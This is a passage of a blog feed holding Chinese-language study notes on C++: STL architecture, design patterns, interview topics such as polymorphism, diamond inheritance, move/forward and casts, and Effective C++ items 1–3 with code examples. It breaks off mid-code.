        <content type="html"><![CDATA[<h1 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h1><p>STL六大部件：容器、分配器、算法、迭代器、适配器、仿函数</p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><h4 id="Interator"><a href="#Interator" class="headerlink" title="Interator"></a>Interator</h4><p>算法和容器的桥梁，有5钟<code>traits</code> ：</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>class _Tp<span class="token operator">></span><span class="token keyword">struct</span> <span class="token class-name">iterator_traits</span><span class="token operator">&lt;</span>_Tp<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">typedef</span> <span class="token class-name">ptrdiff_t</span> difference_type<span class="token punctuation">;</span>    <span class="token keyword">typedef</span> typename _Tp<span class="token operator">::</span>value_type value_type<span class="token punctuation">;</span>    <span class="token keyword">typedef</span> typename _Tp<span class="token operator">::</span>pointer pointer<span class="token punctuation">;</span>    <span class="token keyword">typedef</span> typename _Tp<span class="token operator">::</span>reference reference<span class="token punctuation">;</span>    <span class="token keyword">typedef</span> typename _Tp<span class="token operator">::</span>iterator_category iterator_category<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>通过定义内嵌类型，我们获得了知晓 iterator 所指元素类型的方法，通过 traits 技法，我们将函数模板对于原生指针和自定义 iterator 的定义都统一起来，我们使用 traits 技法主要是为了解决原生指针和自定义 iterator 之间的不同所造成的代码冗余，这就是 traits 技法的妙处所在。</p><h3 id="vector容器"><a href="#vector容器" class="headerlink" title="vector容器"></a>vector容器</h3><ul><li>扩容机制：<br>  2倍扩容，非原地扩容；当要扩容的时候，会将原来的东西复制一遍，开辟一块其他连续的空间。</li></ul><ul><li></li></ul><h3 id="deque-容器"><a href="#deque-容器" class="headerlink" title="deque 容器"></a>deque 容器</h3><p>分段连续</p><h3 id="unoredered-multiset"><a href="#unoredered-multiset" class="headerlink" title="unoredered_multiset"></a>unoredered_multiset</h3><p>bucket个数成倍增长</p><h3 id="map-容器"><a href="#map-容器" class="headerlink" title="map 容器"></a>map 容器</h3><h4 id="Rb-tree"><a href="#Rb-tree" class="headerlink" title="Rb_tree"></a>Rb_tree</h4><p>可以参考文章:<a href="https://leetcode.cn/circle/discuss/SwgIJV/">https://leetcode.cn/circle/discuss/SwgIJV/</a></p><p>经典红黑树的本质：</p><h2 id="分配器"><a href="#分配器" class="headerlink" title="分配器"></a>分配器</h2><h3 id="allocate"><a href="#allocate" class="headerlink" title="allocate"></a>allocate</h3><p>G4.9：调用operator new  -&gt; malloc</p><h3 id="deallocate"><a href="#deallocate" class="headerlink" title="deallocate"></a>deallocate</h3><p>G4.9：调用operator delete -&gt;free</p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/2022/10/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2022/10/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h1><p>利用封装，多态和继承，考虑用一个单独的类来做创造实例的过程。</p><h1 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h1><p>定义了算法家族，分别封装，让他们之间可以互相替换，此模式让算法的变化，不会影响到使用算法的客户。</p><p>所有这些算法完成的都是相同的工作，只是实现不同，它可以以相同的方式调用所有的算法，减少了各种算法类与使用算法类之间的耦合。即策略模式封装了变化。</p><h1 id="单一职责模式"><a href="#单一职责模式" class="headerlink" title="单一职责模式"></a>单一职责模式</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面经</title>
      <link href="/2022/09/29/%E9%9D%A2%E7%BB%8F/"/>
      <url>/2022/09/29/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-C-C-相关"><a href="#1-C-C-相关" class="headerlink" title="1 C/C++ 相关"></a>1 C/C++ 相关</h1><h2 id="1-1-静态多态和动态多态的区别"><a href="#1-1-静态多态和动态多态的区别" class="headerlink" title="1.1 静态多态和动态多态的区别"></a>1.1 静态多态和动态多态的区别</h2><ul><li><p>静态多态：对于相关的对象类型，直接实现它们各自的定义，不需要共有基类，甚至可以没有任何关系。</p><pre class="language-c++" data-language="c++"><code class="language-c++">int Add(int a,int b)                    &#x2F;&#x2F;1&#123;    return a+b;&#125;char Add(char a,char b)                 &#x2F;&#x2F;2&#123;    return a + b;&#125;int main()&#123;    cout&lt;&lt;Add(666 , 888)&lt;&lt;endl;         &#x2F;&#x2F;1    cout&lt;&lt;Add(&#39;1&#39; , &#39;2&#39;);               &#x2F;&#x2F;2    return 0;&#125;</code></pre></li><li><p>动态多态：动态多态是利用虚函数实现运行时的多态，即在系统编译的时候并不知道程序将要调用哪一个函数，只有在运行到这里的时候才能确定接下来会跳转到哪一个函数。</p><ul><li>在类中声明为虚函数</li><li>函数的函数名，返回值，函数参数个数，参数类型，全都与基类的所声明的虚函数相同(否则是函数重载的条件)</li><li>将子类对象的指针(或以引用形式)赋值给父类对象的指针(或引用)，再用该指向父类对象的指针(或引用)调用虚函数</li></ul></li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">namespace DynamicPoly&#123;    class Geometry    &#123;    public:        virtual void Draw()const &#x3D; 0;    &#125;;    class Line : public Geometry    &#123;    public:        virtual void Draw()const&#123;std::cout &lt;&lt; &quot;Line Draw()\n&quot;;&#125;    &#125;;    class Circle : public Geometry    &#123;    public:        virtual void Draw()const&#123;std::cout &lt;&lt; &quot;Circle Draw()\n&quot;;&#125;    &#125;;    class Rectangle : public Geometry    &#123;    public:        virtual void Draw()const&#123;std::cout &lt;&lt; &quot;Rectangle Draw()\n&quot;;&#125;    &#125;;    void DrawGeometry(const Geometry *geo)    &#123;        geo-&gt;Draw();    &#125;    &#x2F;&#x2F;动态多态最吸引人之处在于处理异质对象集合的能力    void DrawGeometry(std::vector&lt;DynamicPoly::Geometry*&gt; vecGeo)    &#123;        const size_t size &#x3D; vecGeo.size();        for(size_t i &#x3D; 0; i &lt; size; ++i)            vecGeo[i]-&gt;Draw();    &#125;&#125;void test_dynamic_polymorphism()&#123;    DynamicPoly::Line line;    DynamicPoly::Circle circle;    DynamicPoly::Rectangle rect;    DynamicPoly::DrawGeometry(&amp;circle);    std::vector&lt;DynamicPoly::Geometry*&gt; vec;    vec.push_back(&amp;line);    vec.push_back(&amp;circle);    vec.push_back(&amp;rect);    DynamicPoly::DrawGeometry(vec);&#125;</code></pre><h2 id="1-2-菱形继承"><a href="#1-2-菱形继承" class="headerlink" title="1.2 菱形继承"></a>1.2 菱形继承</h2><p>如果有两个派生类继承了同一个基类，然后又有一个类同时继承了这两个派生类，这种继承称为菱形继承问题。</p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;*        如果有两个派生类继承了同一个基类，然后又有一个类同时继承了这两个派生类，这种继承称为菱形继承或者钻石型继承                        A                B                   C                        D                                Person        Singer                                                     Waiter                              SingingWaiter        菱形继承带来的问题：                1.歌手继承人的成员，服务员继承人的成员                当唱歌的服务员调用成员的时候，会产生二义性。(加上作用域)                2.唱歌的服务员继承自人的数据有两份，浪费内存        菱形继承带来的问题的解决方案：虚继承*&#x2F;&#x2F;**&#x2F;class Person&#123;public:        int m_Age; &#x2F;&#x2F; 年龄&#125;;&#x2F;&#x2F; 歌手类，加上virtual是虚继承，Person类称为虚基类 class Singer : virtual public Person&#123;&#125;;&#x2F;&#x2F; 服务员类class Waiter : public virtual Person&#123;&#125;;&#x2F;&#x2F; 歌手+服务员类class SingingWaiter : public Singer, public Waiter&#123;&#125;;int main()&#123;        &#x2F;&#x2F; 创建SingingWaiter对象        SingingWaiter sw;        &#x2F;&#x2F; 问题1：访问同名的成员产生二义性        sw.m_Age &#x3D; 200;        &#x2F;*sw.Singer::m_Age &#x3D; 20;        sw.Waiter::m_Age &#x3D; 30;*&#x2F;        &#x2F;&#x2F; 问题2：继承了两份数据，浪费内存        cout &lt;&lt; sw.Singer::m_Age &lt;&lt; endl;        cout &lt;&lt; sw.Waiter::m_Age &lt;&lt; endl;        return 0;&#125;</code></pre><h2 id="1-3-右值引用和转义语义"><a href="#1-3-右值引用和转义语义" class="headerlink" title="1.3 右值引用和转义语义"></a>1.3 右值引用和转义语义</h2><ul><li>右值：右值是其地址无法通过解引用获得的值，因为它们是文字或本质上是临时的(例如，函数或显式构造函数返回的值)。</li><li>右值引用：右值引用的标志是 &amp;&amp;，对右值的引用就是右值引用。</li><li>转移语义：转移语义可以将资源(堆，系统对象等)从一个对象转移到另一个对象，这样能够<code>减少不必要的临时对象的创建、拷贝以及销毁</code>，能够大幅度提高 C++ 应用程序的性能。转移语义是和拷贝语义相对的，可以类比文件的剪切与拷贝，当我们将文件从一个目录拷贝到另一个目录时，速度比剪切慢很多。通过转移语义，临时对象中的资源能够转移其它的对象里。</li></ul><h3 id="1-3-1-std-move作用以及应用场景"><a href="#1-3-1-std-move作用以及应用场景" class="headerlink" title="1.3.1 std::move作用以及应用场景"></a>1.3.1 <code>std::move</code>作用以及应用场景</h3><ul><li>作用：返回传入参数的右值引用。 通过将对象传递给move函数，可以获得引用该对象的右值。</li><li>使用场景：标准库的许多组件都实现了移动语义，允许直接转移对象的资产和属性的所有权，而在参数为右值时无需复制它们。</li></ul><h3 id="1-3-2-std-forward作用以及应用场景"><a href="#1-3-2-std-forward作用以及应用场景" class="headerlink" title="1.3.2 std::forward作用以及应用场景"></a>1.3.2 <code>std::forward</code>作用以及应用场景</h3><ul><li>右值穿参的问题：右值引用类型是独立于值的，一个右值引用参数作为函数的形参，在函数内部再转发该参数的时候它已经变成一个左值，并不是他原来的类型。</li><li>完美转发(Perfect Forwarding)，是指在函数模板中，完全依照模板的参数的类型(即保持参数的左值、右值特征)，将参数传递给函数模板中调用的另外一个函数。C++11中提供了这样的一个函数<code>std::forward</code>，它是为转发而生的，不管参数是T&amp;&amp;这种未定的引用还是明确的左值引用或者右值引用，它会按照参数本来的类型转发。<ul><li>使用场景分析：<code>std::forward</code> 转发问题针对的是模板函数。</li><li>首先, forward常用于template函数中, 使用的时候必须要多带一个template参数T</li><li>其次, 明确只需要move的情况而用forward, 代码意图不清晰, 其他人看着理解起来比较费劲.</li><li>更技术上来说, 他们都可以被static_cast替代. 为什么不用static_cast呢? 也就是为了读着方便易懂. <pre class="language-c++" data-language="c++"><code class="language-c++">template&lt;typename _Tp&gt;  constexpr typename std::remove_reference&lt;_Tp&gt;::type&amp;&amp;  move(_Tp&amp;&amp; __t) noexcept  &#123; return static_cast&lt;typename std::remove_reference&lt;_Tp&gt;::type&amp;&amp;&gt;(__t); &#125;template&lt;typename _Tp&gt;constexpr _Tp&amp;&amp;forward(typename std::remove_reference&lt;_Tp&gt;::type&amp; __t) noexcept&#123; return static_cast&lt;_Tp&amp;&amp;&gt;(__t); &#125;</code></pre></li><li>函数模板 <code>void G(A &amp;&amp;a)</code>内部是无法知道形参对应的实参，到底是个普通变量，还是濒死的临时变量？只能原封不动的完美的转发<code>std::forward</code>给函数模板 <code>void G(A &amp;&amp;a)</code>调用的下一层函数。</li></ul></li></ul><h3 id="1-3-3-move和forward总结："><a href="#1-3-3-move和forward总结：" class="headerlink" title="1.3.3 move和forward总结："></a>1.3.3 <code>move</code>和<code>forward</code>总结：</h3><ul><li><code>std::move</code>无条件转换到右值。就其本身而言，它没有move任何东西。</li><li><code>std::forward</code>只有在它的参数绑定到一个右值上的时候，它才转换它的参数到一个右值。</li><li><code>std::move</code>和<code>std::forward</code>在运行期都没有做任何事情。</li></ul><h2 id="1-4-使用协程的优点"><a href="#1-4-使用协程的优点" class="headerlink" title="1.4 使用协程的优点"></a>1.4 使用协程的优点</h2><ul><li>协程拥有极高的执行效率，子程序切换不是线程切换而是由程序自身控制，没有线程切换开销，和多线程相比，线程数量越多，性能优势越明显。</li><li>不需要多线程锁机制，在协程中控制共享资源不加锁。</li><li>协程没有增加线程数量，在线程基础上分时复用运行多个协程，在用户态完成切换，切换代价很小。</li><li>协程只需要几十个字节保存相关状态信息，空间开销小。</li></ul><h2 id="1-5-四种类型转换的关键字及特点"><a href="#1-5-四种类型转换的关键字及特点" class="headerlink" title="1.5 四种类型转换的关键字及特点"></a>1.5 四种类型转换的关键字及特点</h2><ul><li><p>static_cast<br>实现C++中内置基本数据类型之间的相互转换，涉及到类的话，<code>static_cast</code>只能在有相互联系的类型中进行相互转换</p></li><li><p>const_cast<br>把一个它作用的表达式转换成常量，使一个本来不是const类型的数据转换成const类型的，或者把const属性去掉。</p></li><li><p>reinterpret_cast<br>不同类型的指针之间、不同类型的引用之间以及指针和能容纳指针的整数类型之间的转换。</p></li><li><p>dynamic_cast（运行时）<br>将多态基类的指针或引用强制转换为派生类的指针或引用，而且能够检查转换的安全性。</p></li></ul><h1 id="2-操作系统"><a href="#2-操作系统" class="headerlink" title="2 操作系统"></a>2 操作系统</h1><h1 id="3-计算机网络"><a href="#3-计算机网络" class="headerlink" title="3 计算机网络"></a>3 计算机网络</h1><h1 id="4-数据库"><a href="#4-数据库" class="headerlink" title="4 数据库"></a>4 数据库</h1><h2 id="4-1-Redis"><a href="#4-1-Redis" class="headerlink" title="4.1 Redis"></a>4.1 Redis</h2><h2 id="4-2-Mysql"><a href="#4-2-Mysql" class="headerlink" title="4.2 Mysql"></a>4.2 Mysql</h2>]]></content>
      
      
      <categories>
          
          <category> c </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Effective C++ 笔记</title>
      <link href="/2022/09/21/Effective-C-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/09/21/Effective-C-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="让自己习惯C-：条款-1-4"><a href="#让自己习惯C-：条款-1-4" class="headerlink" title="让自己习惯C++ ：条款(1~4)"></a>让自己习惯C++ ：条款(1~4)</h1><h2 id="条款1-将C-看作一个语言联邦"><a href="#条款1-将C-看作一个语言联邦" class="headerlink" title="条款1 将C++看作一个语言联邦"></a>条款1 将C++看作一个语言联邦</h2><p>早期的C++只是叫”C with classes”，但发展到今天已经成为一个多重泛型编程语言，有四种次语言：</p><ul><li>C</li><li>面向对象 C++ ，也就是 C with class</li><li>template C++ ，也就是C++的泛型编程。由于template强大，带来了template metaprogramming（TMP，模板元编程）</li><li>STL。 template 程序库</li></ul><p>总结：C++高效编程守则视情况变化而变化，取决于使用C++的部分。</p><h2 id="条款2-尽量用const，enum，inline-替换-define"><a href="#条款2-尽量用const，enum，inline-替换-define" class="headerlink" title="条款2 尽量用const，enum，inline 替换 #define"></a>条款2 尽量用const，enum，inline 替换 #define</h2><p>也可以说是使用编译器替换预处理器</p><ol><li>例如：<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ASPECT</span> <span class="token expression"><span class="token number">1.653</span></span></span></code></pre> 在上面这个语句中，字符串’ASPECT’是不会被编译器看到的，而编译器看到的是’1.653’，这就会导致在调试过程中，编译器的错误信息只显示’1.653’而不是’ASPECT’，对调试造成问题。<br> 可以使用如下替换： <pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">double</span> Aspect <span class="token operator">=</span> <span class="token number">1.653</span><span class="token punctuation">;</span>  <span class="token comment">//由于大写名称通常使用于宏，所以 ASPECT->Aspect</span></code></pre></li><li><p>当定义或声明全局变量时，常数指针和类的常数需要另加考虑</p><ul><li><p>对于指针要把指针本身和它指向的数据都定义为const。<br>例如</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> myWord <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span></code></pre><p>在C++中可以更方便地使用std::string这样基于char*类型的推广，例如</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token function">myWord</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>对于类的常数<br>为了将常量的作用域限制于class内，并且确保这个常量不会生成多个拷贝，可以声明为类的私有静态成员</p><pre class="language-c" data-language="c"><code class="language-c">class Player<span class="token punctuation">&#123;</span> private<span class="token operator">:</span>  <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int</span> NumTurns <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>因为此处是类的成员声明范围内，所以上面只是变量的声明和初始化，而并非定义，因此如果想获取变量的地址，需要在别处另加定义。这个定义不能有任何赋值语句，因为在类内已经规定为const:</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">int</span> Player<span class="token operator">::</span>numPlayer<span class="token punctuation">;</span></code></pre></li></ul></li><li><p>枚举技巧<br>假设存在这么一种情况：需要在一个类内声明某变量，但你的编译器不允许在声明时赋值初始化，同时接下来的某个语句却需要用到这个变量的具体数值，如：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> noPlayer<span class="token punctuation">;</span><span class="token keyword">int</span> scores<span class="token punctuation">[</span>noPlayer<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>这个时候编译器会报错，可以使用以下方式解决：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>noPlayer <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> scores<span class="token punctuation">[</span>noPlayer<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>但注意enum类型在内存中没有实体，无法取得enum类型的地址，因此这个方法更相当于取一个本地的#define数值</p></li><li><p>对于#define的宏函数，尽量使用inline修饰的函数来代替#define<br>inline关键字用来建议编译器把某频繁调用的函数当做内联函数，即在每次函数调用时，直接把函数代码放在函数调用语句的地址，减少堆栈浪费。<br>如果为了减少堆栈资源的使用，把某个频繁调用的函数规定为宏，例如用a和b的最大值来调用某函数f:</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">CALL_MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></code></pre><p>但是这样会产生一个新问题</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">CALL_MAX</span><span class="token punctuation">(</span><span class="token operator">++</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//a增加了一次</span><span class="token function">CALL_MAX</span><span class="token punctuation">(</span><span class="token operator">++</span>a<span class="token punctuation">,</span> b<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//a增加了两次 </span></code></pre><p>解决方法：</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span><span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">callMax</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> T<span class="token operator">&amp;</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">f</span><span class="token punctuation">(</span>a <span class="token operator">></span> b <span class="token operator">?</span> a <span class="token operator">:</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h2 id="条款3-多用const"><a href="#条款3-多用const" class="headerlink" title="条款3 多用const"></a>条款3 多用const</h2><ol><li><p>如果要定义某指针或数据为常量不允许改变</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>  <span class="token comment">//数据是const ，数据不允许被改变</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> p<span class="token punctuation">;</span>  <span class="token comment">//指针是const , 指针不允许被改变</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> p<span class="token punctuation">;</span> <span class="token comment">//数据和指针都是const，都不可以被改变</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span>  <span class="token comment">//都表示指向常量char的指针</span><span class="token keyword">char</span> cosnt <span class="token operator">*</span>p<span class="token punctuation">;</span> </code></pre><p>const 在*号左边修饰数据，const在星号右边修饰指针</p></li><li><p>迭代器与const<br>迭代器在功能上相当于指向某类型T的指针T*</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator it <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//表示迭代器本身是常量</span><span class="token operator">*</span>it <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">//编译通过，迭代器是常量，但是数据可以被修改</span><span class="token operator">++</span>it<span class="token punctuation">;</span>   <span class="token comment">//编译失败！因为const迭代器不允许被改变！</span></code></pre><p>如果要更改数据，使用const_iterator</p><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>const_iterator it <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//无法使用，待解决TODO</span></code></pre></li><li><p>尽量使用const可以帮助调试<br>假设存在</p><pre class="language-c" data-language="c"><code class="language-c">class Rational<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Rational operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> lhs<span class="token punctuation">,</span> <span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>在某处使用此乘法操作符，误把比较操作符“==”打成了赋值操作符 “=” ：</p><pre class="language-c" data-language="c"><code class="language-c">Rational a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">*</span> b <span class="token operator">=</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>      </code></pre><p>但编译器在此并不会报错，因为只有当a,b,c是C++自有类型(比如int)才会报错，对于用户自定义的类，编译器会认为此操作是将一个Rational赋值给另一个Rational<br>如果将该操作符定义为返回const，这样赋值将会是非法操作。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> Rational operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> lhs<span class="token punctuation">,</span> <span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>类的成员函数与const<br>给成员函数使用const关键字是非常重要的，它可以让接口更加直观，直接告诉用户这个函数是不是只读(Read only)，会不会改变某变量。</p></li><li><p>成员函数的常量性<br>C++标准对成员函数”常量性”的规定是数据常量性(bitwise constness)，即不允许常量对象的成员数据被修改。C++编译器对此的检测也十分简单粗暴，只检查该成员函数有没有给成员数据的赋值操作。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> Text <span class="token function">ct</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//构造某常量对象</span><span class="token keyword">char</span><span class="token operator">*</span> pc <span class="token operator">=</span> <span class="token operator">&amp;</span>ct<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">//取其指针</span><span class="token operator">*</span>pc <span class="token operator">=</span> <span class="token char">'K'</span><span class="token punctuation">;</span>                     <span class="token comment">//通过指针修改常量对象，编译不会报错，结果为"Kello"</span></code></pre><p>还有另一个局限性，例如：</p><pre class="language-c" data-language="c"><code class="language-c">class Text<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    std<span class="token operator">::</span><span class="token class-name">sizt_t</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    <span class="token keyword">char</span><span class="token operator">*</span> pText<span class="token punctuation">;</span>    std<span class="token operator">::</span><span class="token class-name">size_t</span> length<span class="token punctuation">;</span>    bool lengthValid<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>std<span class="token operator">::</span><span class="token class-name">size_t</span> Text<span class="token operator">::</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>lengthValid<span class="token punctuation">)</span>           <span class="token comment">//做某些错误检测</span>  <span class="token punctuation">&#123;</span>    length <span class="token operator">=</span> std<span class="token operator">::</span><span class="token function">strlen</span><span class="token punctuation">(</span>pText<span class="token punctuation">)</span><span class="token punctuation">;</span>             lengthValid <span class="token operator">=</span> true<span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> length<span class="token punctuation">;</span>             <span class="token comment">//这行才是代码核心</span><span class="token punctuation">&#125;</span></code></pre><p>在这段代码中，length()函数要做某些错误检测，因此可能会修改成员数据。即使真正的功能核心只是返回字符长度，编译器依然认为你可能会修改某些成员数据而报错。因此，更好的方法是逻辑常量性(Logical constness)，即允许某些数据被修改，只要这些改动不会反映在外，例如，以上问题可以用mutable关键字来解决:</p><pre class="language-c" data-language="c"><code class="language-c">mutable std<span class="token operator">::</span><span class="token class-name">size_t</span> length<span class="token punctuation">;</span>mutable bool lengthValid<span class="token punctuation">;</span></code></pre></li><li>在定义常量与非常量成员函数时，避免代码重复<br>其实在这里指的是函数的实现要避免重复。试想某函数既要检查边界范围，又要记录读取历史，还要检查数据完整性，这样的代码复制一遍，既不显得美观，又增加了代码维护的难度和编译时间。因此，可以使用非常量的函数来调用常量函数。<pre class="language-c" data-language="c"><code class="language-c">class TextBook<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    string text<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token function">TextBook</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span>t<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">text</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">TextBook</span><span class="token punctuation">(</span>string <span class="token operator">&amp;&amp;</span>t<span class="token punctuation">)</span> noexcept <span class="token operator">:</span> <span class="token function">text</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">&amp;</span> operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token class-name">size_t</span> pos<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">/*            process the data such as bounds checking , log access data and verify data integrity.        */</span>        <span class="token keyword">return</span> text<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> <span class="token operator">&amp;</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token class-name">size_t</span> pos<span class="token 